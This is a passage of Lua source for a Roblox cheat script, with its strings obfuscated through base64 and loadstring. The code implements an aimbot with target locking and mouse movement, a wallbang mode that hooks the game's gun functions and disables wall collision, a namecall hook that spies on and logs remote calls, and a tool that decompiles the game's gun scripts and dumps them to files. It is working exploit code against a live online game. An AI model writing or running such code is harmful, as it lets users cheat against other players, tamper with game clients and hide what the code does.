aimCircle.AnchorPoint = Vector2.new(0.5, 0.5)
aimCircle.BackgroundTransparency = 1
aimCircle.BorderSizePixel = 0
aimCircle.Visible = false
aimCircle.Parent = overlay
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), aimCircle).CornerRadius = UDim.new(1, 0)
local aimCircleStroke = Instance.new(loadstring(base64decode("VUlTdHJva2U="))())
aimCircleStroke.Color = COLOR
aimCircleStroke.Thickness = 1
aimCircleStroke.Transparency = 0.2
aimCircleStroke.Parent = aimCircle
local AIM_LOCKED_COLOR = Color3.fromRGB(255, 150, 150)

local TRACER_FROMS = { loadstring(base64decode("Qm90dG9t"))(), loadstring(base64decode("Q2VudGVy"))(), loadstring(base64decode("TW91c2U="))() }
local tracerFromIndex = 3
local TRACER_COLOR = Color3.fromRGB(150, 150, 255)
local aimTracer = Instance.new(loadstring(base64decode("RnJhbWU="))())
aimTracer.AnchorPoint = Vector2.new(0.5, 0.5)
aimTracer.BackgroundColor3 = TRACER_COLOR
aimTracer.BackgroundTransparency = 0.5
aimTracer.BorderSizePixel = 0
aimTracer.Visible = false
aimTracer.Parent = overlay

local AIM_BLACKLIST_FILE = loadstring(base64decode("TGFycHdhcmVBaW1CbGFja2xpc3QudHh0"))()
local aimBlacklist = {}

local function saveAimBlacklist()
    if type(writefile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
    local names = {}
    for name in pairs(aimBlacklist) do table.insert(names, name) end
    pcall(writefile, AIM_BLACKLIST_FILE, table.concat(names, loadstring(base64decode("XG4="))()))
end

local function loadAimBlacklist()
    if type(isfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() or type(readfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
    local ok, text = pcall(function()
        return isfile(AIM_BLACKLIST_FILE) and readfile(AIM_BLACKLIST_FILE) or loadstring(base64decode(""))()
    end)
    if not ok then return end
    for line in string.gmatch(text, loadstring(base64decode("W15cclxuXSs="))()) do aimBlacklist[line:lower()] = true end
end
loadAimBlacklist()

local function addAimBlacklist(text)
    local q = (text or loadstring(base64decode(""))()):match(loadstring(base64decode("XiVzKiguLSklcyok"))()):lower()
    if q == loadstring(base64decode(""))() then return end

    local matches = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():sub(1, #q) == q or plr.DisplayName:lower():sub(1, #q) == q then
            table.insert(matches, plr)
        end
    end
    if #matches == 1 then q = matches[1].Name:lower() end
    aimBlacklist[q] = true
    saveAimBlacklist()
end

local function isAimBlacklisted(player)
    return aimBlacklist[player.Name:lower()] == true or aimBlacklist[player.DisplayName:lower()] == true
end

local function aimPart(character)
    local choice = AIM_PARTS[aimPartIndex]
    if choice == loadstring(base64decode("SGVhZA=="))() then return character:FindFirstChild(loadstring(base64decode("SGVhZA=="))()) end
    if choice == loadstring(base64decode("Um9vdA=="))() then return character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) end
    return character:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))())
        or character:FindFirstChild(loadstring(base64decode("VG9yc28="))())
        or character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
end

local function aimCenter(camera)
    if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
        return camera.ViewportSize / 2
    end
    return UserInputService:GetMouseLocation()
end

local wallCheckParams = RaycastParams.new()
wallCheckParams.FilterType = Enum.RaycastFilterType.Exclude
wallCheckParams.IgnoreWater = true

local function stopsBullets(obstacle)
    if obstacle:IsA(loadstring(base64decode("VGVycmFpbg=="))()) then return true end
    if obstacle.Transparency >= 1 or not obstacle.CanCollide then return false end
    if obstacle.Material == Enum.Material.Glass then return false end
    if obstacle:FindFirstAncestorOfClass(loadstring(base64decode("VG9vbA=="))()) then return false end
    local model = obstacle:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
    if model and Players:GetPlayerFromCharacter(model) then return false end
    return true
end

local function isBlocked(camera, character, part)
    local origin = camera.CFrame.Position
    local ignore = { character }
    local mine = LocalPlayer.Character
    if mine then table.insert(ignore, mine) end
    for _ = 1, 15 do
        wallCheckParams.FilterDescendantsInstances = ignore
        local hit = Workspace:Raycast(origin, part.Position - origin, wallCheckParams)
        if not hit then return false end
        if stopsBullets(hit.Instance) then return true end
        table.insert(ignore, hit.Instance)
    end
    return false
end

local function aimTargetPart(player, camera)
    if player == LocalPlayer then return nil end
    if isAimBlacklisted(player) then return nil end
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
    local part = character and aimPart(character)
    if not (part and humanoid) then return nil end
    if humanoid.Health <= DEAD_HEALTH then return nil end
    if options.aimteam and player.Team ~= nil and player.Team == LocalPlayer.Team then return nil end
    if options.aimsafe and character:FindFirstChildOfClass(loadstring(base64decode("Rm9yY2VGaWVsZA=="))()) then return nil end
    if options.aimwall and isBlocked(camera, character, part) then return nil end
    return part
end

local function screenDistance(camera, part)
    local pos, onScreen = camera:WorldToViewportPoint(part.Position)
    if not onScreen then return nil end
    return (Vector2.new(pos.X, pos.Y) - aimCenter(camera)).Magnitude
end

local function findClosest(camera)
    local bestPlayer, bestPart, bestDistance = nil, nil, aimFov
    for _, player in ipairs(Players:GetPlayers()) do
        local character = player ~= LocalPlayer and player.Character
        local part = character and aimPart(character)
        if part then
            local distance = screenDistance(camera, part)

            if distance and distance < bestDistance then
                local checked = aimTargetPart(player, camera)
                if checked then bestPlayer, bestPart, bestDistance = player, checked, distance end
            end
        end
    end
    return bestPlayer, bestPart
end

local function cancelLock()
    aim.locked = nil
    if aim.savedSensitivity then
        local saved = aim.savedSensitivity
        aim.savedSensitivity = nil
        pcall(function() UserInputService.MouseDeltaSensitivity = saved end)
    end
end

local function mouseDown(button)
    return UserInputService:IsMouseButtonPressed(button)
end

local function currentGunTool()
    local character = LocalPlayer.Character
    if not character then return nil end
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA(loadstring(base64decode("VG9vbA=="))()) and child:FindFirstChild(loadstring(base64decode("R3VuU2NyaXB0"))()) then return child end
    end
    return nil
end

local function gunOut()
    if not options.aimgun then return true end
    local character = LocalPlayer.Character
    if not character then return false end
    return character:FindFirstChild(loadstring(base64decode("R1VOQUlNVkFMVUU="))()) ~= nil or currentGunTool() ~= nil
end

local gun = {
    tool = nil, env = nil, method = nil,
    rayOrig = nil, rayWrap = nil, fireOrig = nil, fireWrap = nil,
    inFire = false, alive = true, spyHooked = false,
    wallbang = false, shotWalled = false, walled = 0, lastInstance = nil, lastShot = nil, fireCalls = 0,
}

local function getGunEnv(tool)
    local gunScript = tool:FindFirstChild(loadstring(base64decode("R3VuU2NyaXB0"))())
    if gunScript and type(getsenv) == loadstring(base64decode("ZnVuY3Rpb24="))() then
        local ok, env = pcall(getsenv, gunScript)
        if ok and type(env) == loadstring(base64decode("dGFibGU="))() then return env, loadstring(base64decode("Z2V0c2Vudg=="))() end
    end
    if type(getgc) == loadstring(base64decode("ZnVuY3Rpb24="))() then
        local ok, list = pcall(getgc, true)
        if ok and type(list) == loadstring(base64decode("dGFibGU="))() then
            for _, t in ipairs(list) do
                if type(t) == loadstring(base64decode("dGFibGU="))() and type(rawget(t, loadstring(base64decode("UmF5Q2FzdDI="))())) == loadstring(base64decode("ZnVuY3Rpb24="))()
                    and type(rawget(t, loadstring(base64decode("ZmlyZUJ1bGxldA=="))())) == loadstring(base64decode("ZnVuY3Rpb24="))() then
                    return t, loadstring(base64decode("Z2V0Z2M="))()
                end
            end
        end
    end
    return nil, nil
end

local wallbangParams = RaycastParams.new()
wallbangParams.FilterType = Enum.RaycastFilterType.Include
wallbangParams.IgnoreWater = true

local function engineOn()
    return gun.alive and not options.freecam and options.wallbang and WALL_METHODS[wallMethodIndex] ~= loadstring(base64decode("UGFydHM="))()
end

local function playerBodyParts()
    local list = {}
    for _, player in ipairs(Players:GetPlayers()) do
        local character = player ~= LocalPlayer and player.Character
        if character then
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and part.Transparency < 1 then table.insert(list, part) end
            end
        end
    end
    return list
end

local function makeRayWrap(orig)
    return function(origin, direction, distance, ignores, params, depth, ...)
        local topLevel = gun.inFire and (depth == nil or depth <= 1) and typeof(origin) == loadstring(base64decode("VmVjdG9yMw=="))()
        if topLevel and gun.wallbang and typeof(direction) == loadstring(base64decode("VmVjdG9yMw=="))() and type(distance) == loadstring(base64decode("bnVtYmVy"))() then
            local ok, hit = pcall(Workspace.Raycast, Workspace, origin + direction * 0.01, direction * distance, wallbangParams)
            if ok and hit then
                params = wallbangParams
                gun.shotWalled = true
            end
        end
        local results = table.pack(orig(origin, direction, distance, ignores, params, depth, ...))
        if topLevel then gun.lastInstance = results[1] end
        return table.unpack(results, 1, results.n)
    end
end

local feedback = { relayedAt = 0, bloodAt = 0, bloodChar = nil }
do
    local bulletEvent = ReplicatedStorage:FindFirstChild(loadstring(base64decode("QnVsbGV0RXZlbnQ="))())
    if bulletEvent then
        table.insert(connections, bulletEvent.OnClientEvent:Connect(function(shooter, kind)
            if shooter == LocalPlayer and kind == loadstring(base64decode("QnVsbGV0UmVuZGVy"))() then feedback.relayedAt = os.clock() end
        end))
    end
    local bloodEvent = ReplicatedStorage:FindFirstChild(loadstring(base64decode("Qmxvb2RFdmVudA=="))())
    if bloodEvent then
        table.insert(connections, bloodEvent.OnClientEvent:Connect(function(character)
            if typeof(character) == loadstring(base64decode("SW5zdGFuY2U="))() then
                feedback.bloodChar, feedback.bloodAt = character, os.clock()
            end
        end))
    end
end

local function reportShot(shotAt)
    local part = gun.lastInstance
    gun.lastInstance = nil
    if not part then gun.lastShot = loadstring(base64decode("cmF5IGhpdCBub3RoaW5n"))() return end
    local model = part.Parent and part:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
    local humanoid = model and model ~= LocalPlayer.Character and model:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
    if not humanoid then
        gun.lastShot = loadstring(base64decode("cmF5IGhpdCA="))() .. part.Name .. loadstring(base64decode("IChub3QgYSBwbGF5ZXIp"))()
        return
    end
    local before, name, walled = humanoid.Health, model.Name, gun.shotWalled
    gun.lastShot = name .. loadstring(base64decode("OiB3YWl0aW5nLi4u"))()
    task.delay(0.9, function()
        local after = humanoid.Health
        local relayed = feedback.relayedAt >= shotAt
        local blood = feedback.bloodChar == model and feedback.bloodAt >= shotAt
        local verdict
        if after < before or blood then
            verdict = loadstring(base64decode("QUNDRVBURUQ="))()
        elseif relayed then
            verdict = loadstring(base64decode("cmVsYXllZCwgTk8gREFNQUdF"))()
        else
            verdict = loadstring(base64decode("RFJPUFBFRCBieSBzZXJ2ZXI="))()
        end
        gun.lastShot = string.format(loadstring(base64decode("JXMlczogJXMgKGhwICVkPiVkKQ=="))(), name, walled and loadstring(base64decode("IFt3YWxsXQ=="))() or loadstring(base64decode(""))(), verdict, before, after)
    end)
end

local function makeFireWrap(orig)
    return function(...)
        local shotAt = os.clock()
        gun.fireCalls += 1
        gun.wallbang, gun.shotWalled, gun.lastInstance = false, false, nil
        if gun.alive and not options.freecam and options.wallbang and WALL_METHODS[wallMethodIndex] ~= loadstring(base64decode("UGFydHM="))() then
            gun.wallbang = true
            wallbangParams.FilterDescendantsInstances = playerBodyParts()
        end
        gun.inFire = true
        local results = table.pack(pcall(orig, ...))
        gun.inFire = false
        if gun.shotWalled then gun.walled += 1 end
        pcall(reportShot, shotAt)
        gun.wallbang, gun.shotWalled = false, false
        if not results[1] then error(results[2], 0) end
        return table.unpack(results, 2, results.n)
    end
end

local function patchGun()
    if not engineOn() then return end
    local tool = currentGunTool()
    if tool ~= gun.tool then
        gun.tool, gun.env, gun.method = tool, nil, nil
        gun.rayWrap, gun.fireWrap = nil, nil
    end
    if not tool then return end
    if not gun.env then gun.env, gun.method = getGunEnv(tool) end
    local env = gun.env
    if not env then return end

    local ray = env.RayCast2
    if type(ray) == loadstring(base64decode("ZnVuY3Rpb24="))() and ray ~= gun.rayWrap then
        gun.rayOrig = ray
        gun.rayWrap = makeRayWrap(ray)
        pcall(rawset, env, loadstring(base64decode("UmF5Q2FzdDI="))(), gun.rayWrap)
    end
    local fire = env.fireBullet
    if type(fire) == loadstring(base64decode("ZnVuY3Rpb24="))() and fire ~= gun.fireWrap then
        gun.fireOrig = fire
        gun.fireWrap = makeFireWrap(fire)
        gun.fireCalls = 0
        pcall(rawset, env, loadstring(base64decode("ZmlyZUJ1bGxldA=="))(), gun.fireWrap)
    end
end

local wallOff = {}
local wallReleased = 0
local wallPartsParams = RaycastParams.new()
wallPartsParams.FilterType = Enum.RaycastFilterType.Exclude

local function restoreWallParts(keep)
    for part, original in pairs(wallOff) do
        if not (keep and keep[part]) then
            if part.Parent then part.CanCollide = original end
            wallOff[part] = nil
        end
    end
end

local function wallPartsActive()
    if not options.wallbang or options.freecam or not gun.alive then return false end
    local method = WALL_METHODS[wallMethodIndex]
    if method == loadstring(base64decode("RW5naW5l"))() then return false end
    if method == loadstring(base64decode("QXV0bw=="))() and gun.rayWrap and gun.fireWrap and gun.fireCalls > 0 then return false end
    return currentGunTool() ~= nil
end

local function stepWallParts()
    if not wallPartsActive() then
        restoreWallParts(nil)
        return
    end
    local now = os.clock()
    local firing = mouseDown(Enum.UserInputType.MouseButton1) or mouseDown(Enum.UserInputType.MouseButton2)
    if firing then
        wallReleased = now
    elseif now - wallReleased > 0.3 then
        restoreWallParts(nil)
        return
    else
        return
    end

    local camera = Workspace.CurrentCamera
    if not camera then return end
    local center = aimCenter(camera)
    local ray = camera:ViewportPointToRay(center.X, center.Y)

    local ignore = { LocalPlayer.Character }
    local blockers, keep, found = {}, {}, false
    for _ = 1, 12 do
        wallPartsParams.FilterDescendantsInstances = ignore
        local hit = Workspace:Raycast(ray.Origin, ray.Direction * 900, wallPartsParams)
        if not hit then break end
        local part = hit.Instance
        local model = part:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
        local owner = model and Players:GetPlayerFromCharacter(model)
        if owner and owner ~= LocalPlayer then
            found = true
            break
        end
        if part:IsA(loadstring(base64decode("VGVycmFpbg=="))()) then break end
        if part.CanCollide or wallOff[part] ~= nil then table.insert(blockers, part) end
        table.insert(ignore, part)
    end

    if not found then
        restoreWallParts(nil)
        return
    end
    for _, part in ipairs(blockers) do
        keep[part] = true
        if wallOff[part] == nil then
            wallOff[part] = part.CanCollide
            part.CanCollide = false
        end
    end
    restoreWallParts(keep)
end

local function capabilityText()
    local checks = {
        { loadstring(base64decode("Z2V0c2Vudg=="))(), type(getsenv) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("Z2V0Z2M="))(), type(getgc) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("aG9va21ldGFtZXRob2Q="))(), type(hookmetamethod) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("aG9va2Z1bmN0aW9u"))(), type(hookfunction) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("Z2V0bmFtZWNhbGxtZXRob2Q="))(), type(getnamecallmethod) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("bmV3Y2Nsb3N1cmU="))(), type(newcclosure) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("Y2hlY2tjYWxsZXI="))(), type(checkcaller) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("ZGVjb21waWxl"))(), type(decompile) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("d3JpdGVmaWxl"))(), type(writefile) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("YXBwZW5kZmlsZQ=="))(), type(appendfile) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("ZmlyZWNsaWNrZGV0ZWN0b3I="))(), type(fireclickdetector) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("ZGVidWcuc2V0dXB2YWx1ZQ=="))(), type(debug) == loadstring(base64decode("dGFibGU="))() and type(debug.setupvalue) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("bW91c2Vtb3ZlcmVs"))(), type(mousemoverel) == loadstring(base64decode("ZnVuY3Rpb24="))() },
        { loadstring(base64decode("bW91c2Vtb3ZlYWJz"))(), type(mousemoveabs) == loadstring(base64decode("ZnVuY3Rpb24="))() },
    }
    local function tag(ok) return string.format('<font color=loadstring(base64decode("JXM="))()>%s</font>', ok and loadstring(base64decode("IzVhZmY3OA=="))() or loadstring(base64decode("I2ZmNWE1YQ=="))(), ok and loadstring(base64decode("eWVz"))() or loadstring(base64decode("Tk8="))()) end
    local silentPossible = checks[1][2] or checks[2][2]
    local spyPossible = checks[3][2] and checks[5][2]
    local lines = {
        loadstring(base64decode("U2lsZW50IGFpbTog"))() .. tag(silentPossible),
        loadstring(base64decode("UmVtb3RlIFNweTog"))() .. tag(spyPossible),
        loadstring(base64decode(""))(),
    }
    for _, check in ipairs(checks) do
        table.insert(lines, check[1] .. loadstring(base64decode("OiA="))() .. tag(check[2]))
    end
    return table.concat(lines, loadstring(base64decode("XG4="))())
end

local SPY_FILE = loadstring(base64decode("VG93bkVzcFJlbW90ZUxvZy50eHQ="))()
local DUMP_FILE = loadstring(base64decode("VG93bkVzcEd1bkR1bXAudHh0"))()
local GUN_SCRIPT_FILE = loadstring(base64decode("VG93bkVzcEd1blNjcmlwdC50eHQ="))()
local SPY_IGNORE = { CameraEvent = true }
local spyCount = 0

local function fmtArg(v, depth)
    local t = typeof(v)
    if t == loadstring(base64decode("c3RyaW5n"))() then return string.format(loadstring(base64decode("JXE="))(), string.sub(v, 1, 60)) end
    if t == loadstring(base64decode("bnVtYmVy"))() or t == loadstring(base64decode("Ym9vbGVhbg=="))() or t == loadstring(base64decode("bmls"))() then return tostring(v) end
    if t == loadstring(base64decode("SW5zdGFuY2U="))() then
        local ok, name = pcall(function() return v:GetFullName() end)
        return loadstring(base64decode("PA=="))() .. (ok and name or loadstring(base64decode("Pw=="))()) .. loadstring(base64decode("Pg=="))()
    end
    if t == loadstring(base64decode("dGFibGU="))() then
        local parts, count = {}, 0
        for k, val in pairs(v) do
            count += 1
            if count <= 6 then
                table.insert(parts, tostring(k) .. loadstring(base64decode("PQ=="))() .. (depth < 1 and fmtArg(val, depth + 1) or typeof(val)))
            end
        end
        return loadstring(base64decode("ew=="))() .. table.concat(parts, loadstring(base64decode("LCA="))()) .. (count > 6 and loadstring(base64decode("LCAuLi4="))() or loadstring(base64decode(""))()) .. loadstring(base64decode("fQ=="))()
    end
    return t .. loadstring(base64decode("Og=="))() .. tostring(v)
end

local function logRemote(remote, method, args)
    local ok, line = pcall(function()
        local parts = {}
        for JfZaEVmK = 1, args.n do parts[JfZaEVmK] = fmtArg(args[JfZaEVmK], 0) end
        return string.format(loadstring(base64decode("WyUuMmZdICVzOiVzKCVzKQ=="))(), os.clock() % 10000, remote:GetFullName(), method, table.concat(parts, loadstring(base64decode("LCA="))()))
    end)
    if not ok then return end
    spyCount += 1
    print(loadstring(base64decode("W1Rvd25Fc3Agc3B5XSA="))() .. line)
    if type(appendfile) == loadstring(base64decode("ZnVuY3Rpb24="))() then pcall(appendfile, SPY_FILE, line .. loadstring(base64decode("XG4="))()) end
    if spyRefresh then spyRefresh() end
end

local function dumpGun()
    local character = LocalPlayer.Character
    local tool = character and character:FindFirstChildOfClass(loadstring(base64decode("VG9vbA=="))())
    if not tool then
        local backpack = LocalPlayer:FindFirstChildOfClass(loadstring(base64decode("QmFja3BhY2s="))())
        tool = backpack and backpack:FindFirstChildOfClass(loadstring(base64decode("VG9vbA=="))())
    end
    if not tool then return false, loadstring(base64decode("Tm8gdG9vbA=="))() end
    if type(writefile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return false, loadstring(base64decode("Tm8gd3JpdGVmaWxl"))() end

    local base = tool:GetFullName()
    local lines = { loadstring(base64decode("VG9vbDog"))() .. base, loadstring(base64decode(""))() }
    local function rel(instance) return (instance:GetFullName():sub(#base + 2)) end

    local attributes = tool:GetAttributes()
    for key, value in pairs(attributes) do table.insert(lines, loadstring(base64decode("YXR0ciA="))() .. key .. loadstring(base64decode("ID0g"))() .. tostring(value)) end

    for _, d in ipairs(tool:GetDescendants()) do
        local entry = d.ClassName .. loadstring(base64decode("ICA="))() .. rel(d)
        if d:IsA(loadstring(base64decode("VmFsdWVCYXNl"))()) then entry ..= loadstring(base64decode("ICA9IA=="))() .. tostring(d.Value) end
        table.insert(lines, entry)
        if d:IsA(loadstring(base64decode("THVhU291cmNlQ29udGFpbmVy"))()) then
            local ok, source = false, nil
            if type(decompile) == loadstring(base64decode("ZnVuY3Rpb24="))() then ok, source = pcall(decompile, d) end
            if ok and type(source) == loadstring(base64decode("c3RyaW5n"))() and #source > 0 then
                table.insert(lines, loadstring(base64decode("LS0tLSBzb3VyY2Ugb2Yg"))() .. rel(d) .. loadstring(base64decode("IC0tLS0="))())
                table.insert(lines, source)
                table.insert(lines, loadstring(base64decode("LS0tLSBlbmQgLS0tLQ=="))())
                if d.Name == loadstring(base64decode("R3VuU2NyaXB0"))() and d:IsA(loadstring(base64decode("TG9jYWxTY3JpcHQ="))()) then
                    pcall(writefile, GUN_SCRIPT_FILE, source)
                end
            else
                table.insert(lines, loadstring(base64decode("ICAoc291cmNlIG5vdCByZWFkYWJsZTogc2VydmVyIHNjcmlwdCBvciBubyBkZWNvbXBpbGUp"))())
            end
        end
    end
    pcall(writefile, DUMP_FILE, table.concat(lines, loadstring(base64decode("XG4="))()))
    return true, tool.Name
end

if type(hookmetamethod) == loadstring(base64decode("ZnVuY3Rpb24="))() and type(getnamecallmethod) == loadstring(base64decode("ZnVuY3Rpb24="))() then
    local wrap = type(newcclosure) == loadstring(base64decode("ZnVuY3Rpb24="))() and newcclosure or function(f) return f end
    local ok, err = pcall(function()
        local old
        old = hookmetamethod(game, loadstring(base64decode("X19uYW1lY2FsbA=="))(), wrap(function(self, ...)
            if gun.alive and options.spy then
                local method = getnamecallmethod()
                if (method == loadstring(base64decode("RmlyZVNlcnZlcg=="))() or method == loadstring(base64decode("SW52b2tlU2VydmVy"))()) and not SPY_IGNORE[self.Name] then
                    task.defer(logRemote, self, method, table.pack(...))
                end
            end
            return old(self, ...)
        end))
    end)
    gun.spyHooked = ok
    if not ok then warn(loadstring(base64decode("W1Rvd25Fc3BdIHJlbW90ZSBzcHkgaG9vayBmYWlsZWQ6IA=="))() .. tostring(err)) end
end

local function applyLock(camera, part, dt)
    local offset = Vector3.zero
    if options.aimoffset then
        local humanoid = part.Parent and part.Parent:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
        if humanoid then offset = humanoid.MoveDirection * (math.clamp(aimOffset, 1, 30) / 10) end
    end
    local targetPosition = part.Position + offset

    if AIM_LOCKS[aimLockIndex] == loadstring(base64decode("TW91c2U="))() and type(mousemoverel) == loadstring(base64decode("ZnVuY3Rpb24="))() then
        local screen = camera:WorldToViewportPoint(targetPosition)
        local mouse = UserInputService:GetMouseLocation()
        local divisor = 1 + aimSmooth / 10
        mousemoverel((screen.X - mouse.X) / divisor, (screen.Y - mouse.Y) / divisor)
        return
    end

    if AIM_LOCKS[aimLockIndex] == loadstring(base64decode("QWJzb2x1dGU="))() and type(mousemoveabs) == loadstring(base64decode("ZnVuY3Rpb24="))() then
        local screen = camera:WorldToViewportPoint(targetPosition)
        local mouse = UserInputService:GetMouseLocation()
        local divisor = 1 + aimSmooth / 10
        mousemoveabs(mouse.X + (screen.X - mouse.X) / divisor, mouse.Y + (screen.Y - mouse.Y) / divisor)
        return
    end

    if not aim.savedSensitivity then
        aim.savedSensitivity = UserInputService.MouseDeltaSensitivity
    end
    pcall(function() UserInputService.MouseDeltaSensitivity = 0 end)
    local origin = camera.CFrame.Position
    local desired = (targetPosition - origin)
    if desired.Magnitude < 0.001 then return end
    local alpha = aimSmooth <= 0 and 1 or (1 - (aimSmooth / 100) ^ (dt * 60))
    local look = camera.CFrame.LookVector:Lerp(desired.Unit, math.clamp(alpha, 0, 1))
    if look.Magnitude >= 1e-3 then
        camera.CFrame = CFrame.lookAt(origin, origin + look)
    end
end

local function stepAim(dt)
    local camera = Workspace.CurrentCamera
    if not camera then return end

    aimCircle.Visible = options.aimbot and options.aimcircle and not options.freecam
    if aimCircle.Visible then
        local center = aimCenter(camera)
        aimCircle.Size = UDim2.fromOffset(aimFov * 2, aimFov * 2)
        aimCircle.Position = UDim2.fromOffset(center.X, center.Y)
        aimCircleStroke.Color = aim.locked and AIM_LOCKED_COLOR or COLOR
    end

    local tracerPart
    if options.aimbot and options.aimtracer and not options.freecam and not aim.locked and gunOut() then
        local _, found = findClosest(camera)
        tracerPart = found
    end
    if tracerPart then
        local size = camera.ViewportSize
        local from = tracerFromIndex == 1 and Vector2.new(size.X / 2, size.Y)
            or tracerFromIndex == 2 and size / 2
            or aimCenter(camera)
        local screen = camera:WorldToViewportPoint(tracerPart.Position)
        setLine(aimTracer, from, Vector2.new(screen.X, screen.Y))
    else
        aimTracer.Visible = false
    end

    pcall(stepWallParts)

    local now = os.clock()
    if now - lastPatch > 0.2 then
        lastPatch = now
        pcall(patchGun)
    end

    if now - lastDebug > 0.25 then
        lastDebug = now
        if wallDebugLabel then
            local opened = 0
            for _ in pairs(wallOff) do opened += 1 end
            wallDebugLabel.Text = string.format(loadstring(base64decode("R3VuOiAlcyAgRW5naW5lOiAlcyAoc2hvdHMgc2VlbjogJWQpXG5UaHJvdWdoIHdhbGxzOiAlZCAgT3BlbmVkOiAlZFxuTGFzdDogJXM="))(),
                currentGunTool() and loadstring(base64decode("eWVz"))() or loadstring(base64decode("Tk8="))(), gun.method or loadstring(base64decode("Tk9ORQ=="))(), gun.fireCalls, gun.walled, opened, gun.lastShot or loadstring(base64decode("LQ=="))())
        end
        if aimDebugLabel then
            local nearest = options.aimbot and (findClosest(camera)) or nil
            aimDebugLabel.Text = string.format(loadstring(base64decode("TG9ja2VkOiAlc1xuTmVhcmVzdDogJXM="))(),
                aim.locked and aim.locked.Name or loadstring(base64decode("bm8="))(), nearest and nearest.Name or loadstring(base64decode("bm9uZQ=="))())
        end
    end

    if not options.aimbot or options.freecam or not aim.running
        or UserInputService:GetFocusedTextBox() or not gunOut() then
        if aim.locked or aim.savedSensitivity then cancelLock() end
        return
    end

    local part
    if aim.locked then
        part = aimTargetPart(aim.locked, camera)
        local distance = part and screenDistance(camera, part)
        if not part or not distance or distance > aimFov then
            cancelLock()
            part = nil
        end
    end
    if not part then
        local player, found = findClosest(camera)
        if player then
            aim.locked = player
            part = found
        end
    end
    if part then
        applyLock(camera, part, dt)
    else
        cancelLock()
    end
end

table.insert(connections, UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType ~= Enum.UserInputType.MouseButton2 or UserInputService:GetFocusedTextBox() then return end
    if options.aimtoggle then
        aim.running = not aim.running
        if not aim.running then cancelLock() end
    else
        aim.running = true
    end
end))
table.insert(connections, UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType ~= Enum.UserInputType.MouseButton2 then return end
    if not options.aimtoggle then
        aim.running = false
        cancelLock()
    end
end))

pcall(function()
    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcEFpbQ=="))(), Enum.RenderPriority.Camera.Value + 1, stepAim)
end)

local killLog = { alive = true }
do
    local KILL_LOG_TIME = 8
    local KILL_LOG_MAX = 6
    local KILLER_MAX_AGE = 30
    local DOWN_HEALTH = 1.5
    local GUESS_RANGE = 300
    local ME_COLOR = loadstring(base64decode("IzVhZmY3OA=="))()
    local DEAD_COLOR = loadstring(base64decode("I2ZmNWE1YQ=="))()

    local logged = setmetatable({}, { __mode = loadstring(base64decode("aw=="))() })
    local killers = setmetatable({}, { __mode = loadstring(base64decode("aw=="))() })
    local lines, counter = {}, 0

    local TweenService = game:GetService(loadstring(base64decode("VHdlZW5TZXJ2aWNl"))())

    local frame = Instance.new(loadstring(base64decode("RnJhbWU="))())
    frame.AnchorPoint = Vector2.new(1, 1)
    frame.Position = UDim2.new(1, -14, 1, -70)
    frame.Size = UDim2.fromOffset(360, 200)
    frame.BackgroundTransparency = 1
    frame.Parent = overlay
    local layout = Instance.new(loadstring(base64decode("VUlMaXN0TGF5b3V0"))())
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
    layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
    layout.Padding = UDim.new(0, 4)
    layout.Parent = frame

    local function fadeOut(label)
        if not label.Parent then return end
        local info = TweenInfo.new(0.4)
        TweenService:Create(label, info, { BackgroundTransparency = 1, TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
        local stroke = label:FindFirstChildOfClass(loadstring(base64decode("VUlTdHJva2U="))())
        if stroke then TweenService:Create(stroke, info, { Transparency = 1 }):Play() end
        task.delay(0.45, function()
            if label.Parent then label:Destroy() end
        end)
    end

    local function pushLine(text)
        counter += 1
        local label = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
        label.LayoutOrder = counter
        label.AutomaticSize = Enum.AutomaticSize.X
        label.Size = UDim2.fromOffset(0, 22)
        label.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        label.BackgroundTransparency = 0.25
        label.BorderSizePixel = 0
        label.Font = Enum.Font.Code
        label.TextSize = 14
        label.RichText = true
        label.Text = text
        label.TextColor3 = COLOR
        label.TextStrokeTransparency = 0.5
        label.TextXAlignment = Enum.TextXAlignment.Center
